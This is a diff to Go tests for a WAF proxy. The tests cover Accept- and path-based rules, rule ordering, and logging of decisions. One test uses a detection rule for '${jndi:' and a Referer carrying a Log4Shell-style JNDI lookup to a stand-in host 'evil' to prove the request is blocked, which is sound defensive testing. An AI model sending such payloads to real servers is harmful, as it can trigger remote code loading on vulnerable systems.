@@ -71,6 +71,11 @@ func testServerWithMetrics(t testing.TB, yaml string) (*httptest.Server, *Server
 
 func testServerAndHandlerWithStore(t testing.TB, yaml string, st store.Store, m *metrics.Metrics) (*httptest.Server, *Server) {
 	t.Helper()
+	return testServerAndHandlerWithStoreAndLogger(t, yaml, st, m, slog.Default())
+}
+
+func testServerAndHandlerWithStoreAndLogger(t testing.TB, yaml string, st store.Store, m *metrics.Metrics, log *slog.Logger) (*httptest.Server, *Server) {
+	t.Helper()
 	path := filepath.Join(t.TempDir(), "guardian.yaml")
 	if err := os.WriteFile(path, []byte(yaml), 0o600); err != nil {
 		t.Fatal(err)
@@ -86,7 +91,7 @@ func testServerAndHandlerWithStore(t testing.TB, yaml string, st store.Store, m 
 	}
 	mgr := pow.NewManager(key, st)
 	mgr.NoJSMinDelay = 50 * time.Millisecond
-	engine, err := core.NewEngine(cfg, st, mgr, slog.Default())
+	engine, err := core.NewEngine(cfg, st, mgr, log)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -97,7 +102,7 @@ func testServerAndHandlerWithStore(t testing.TB, yaml string, st store.Store, m 
 	if m != nil {
 		engine.SetMetrics(m)
 	}
-	h := New(engine, mgr, st, m, slog.Default())
+	h := New(engine, mgr, st, m, log)
 	ts := httptest.NewServer(h)
 	t.Cleanup(ts.Close)
 	return ts, h
@@ -235,12 +240,20 @@ func TestRequireProxiedGate(t *testing.T) {
 }
 
 // TestAuthHeaderAndMethodRules proves the auth endpoint feeds the WAF what
-// header/method rules need: a header:referer rule fires on the Referer the
-// auth subrequest inherits from the client, and a methods-only rule fires on
-// the method relayed via X-Guardian-Method.
+// header/method rules need: named Accept and Referer rules see the headers the
+// auth subrequest inherits from the client, and a methods-only rule sees the
+// method relayed via X-Guardian-Method.
 func TestAuthHeaderAndMethodRules(t *testing.T) {
 	rules := filepath.Join(t.TempDir(), "rules.yaml")
 	if err := os.WriteFile(rules, []byte(`rules:
+  - id: api-json
+    action: allow
+    targets: [ "header:accept" ]
+    regexes: [ 'application/(json|problem\+json)' ]
+  - id: api-path
+    action: deny
+    targets: [ path ]
+    keywords: [ "/api/" ]
   - id: jndi-header
     targets: [ "header:referer" ]
     keywords: [ "${jndi:" ]
@@ -249,10 +262,12 @@ func TestAuthHeaderAndMethodRules(t *testing.T) {
 `), 0o600); err != nil {
 		t.Fatal(err)
 	}
-	ts := testServerWithYAML(t, fmt.Sprintf(`store: { backend: memory }
+	var decisionLog bytes.Buffer
+	log := slog.New(slog.NewTextHandler(&decisionLog, nil))
+	ts, _ := testServerAndHandlerWithStoreAndLogger(t, fmt.Sprintf(`store: { backend: memory }
 defaults:
-  waf: { rules: { enabled: true, file: "%s" } }
-`, rules))
+  waf: { rules: { enabled: true, files: [ "%s" ] } }
+`, rules), store.NewMemory(), nil, log)
 
 	// Clean request: allowed.
 	resp := do(t, "GET", ts.URL+"/auth", guardianHeaders("plain.test", "198.51.100.7", "/page", "Mozilla/5.0"), nil)
@@ -260,8 +275,30 @@ defaults:
 		t.Fatalf("clean: status = %d, want 200", resp.StatusCode)
 	}
 
+	// The generic named-header path handles Accept without special plumbing.
+	// Because file order is policy order, the allow rule wins over the later
+	// path deny when both match.
+	h := guardianHeaders("plain.test", "198.51.100.7", "/api/items", "api-client/1.0")
+	h["Accept"] = "text/html, Application/Problem+JSON; Charset=UTF-8"
+	resp = do(t, "GET", ts.URL+"/auth", h, nil)
+	if resp.StatusCode != http.StatusOK || resp.Header.Get("X-Guardian-Reason") != "waf:api-json" {
+		t.Fatalf("allowed Accept: status = %d reason = %q, want 200 waf:api-json",
+			resp.StatusCode, resp.Header.Get("X-Guardian-Reason"))
+	}
+	if got := decisionLog.String(); !strings.Contains(got, "action=allow") || !strings.Contains(got, "reason=waf:api-json") {
+		t.Fatalf("WAF allow decision was not logged with its rule ID: %s", got)
+	}
+
+	h = guardianHeaders("plain.test", "198.51.100.7", "/api/items", "api-client/1.0")
+	h["Accept"] = "text/plain"
+	resp = do(t, "GET", ts.URL+"/auth", h, nil)
+	if resp.StatusCode != http.StatusForbidden || resp.Header.Get("X-Guardian-Reason") != "waf:api-path" {
+		t.Fatalf("non-allowed Accept: status = %d reason = %q, want 403 waf:api-path",
+			resp.StatusCode, resp.Header.Get("X-Guardian-Reason"))
+	}
+
 	// Same request with a JNDI payload in the Referer: denied by the header rule.
-	h := guardianHeaders("plain.test", "198.51.100.7", "/page", "Mozilla/5.0")
+	h = guardianHeaders("plain.test", "198.51.100.7", "/page", "Mozilla/5.0")
 	h["Referer"] = "https://example.com/?x=${jndi:ldap://evil/a}"
 	resp = do(t, "GET", ts.URL+"/auth", h, nil)
 	if resp.StatusCode != http.StatusForbidden || resp.Header.Get("X-Guardian-Reason") != "waf:jndi-header" {
@@ -660,7 +697,7 @@ defaults:
   pow: { enabled: true, mode: always, base_difficulty: 2, max_difficulty: 4 }
   waf:
     honeypot: { enabled: true, paths: [ "/trap" ] }
-    rules: { enabled: true, file: %q }
+    rules: { enabled: true, files: [ %q ] }
   denylist: { ips: [ "203.0.113.66" ] }
 domains:
   html.test: { pow: { enabled: true } }
